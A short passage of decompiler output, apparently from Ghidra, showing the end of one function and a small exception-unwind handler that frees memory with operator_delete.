  FUN_10001680((undefined4 *)(unaff_EBP + -0x930));
  return;
}



void Unwind_10006ef0(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x218));
  return;
}


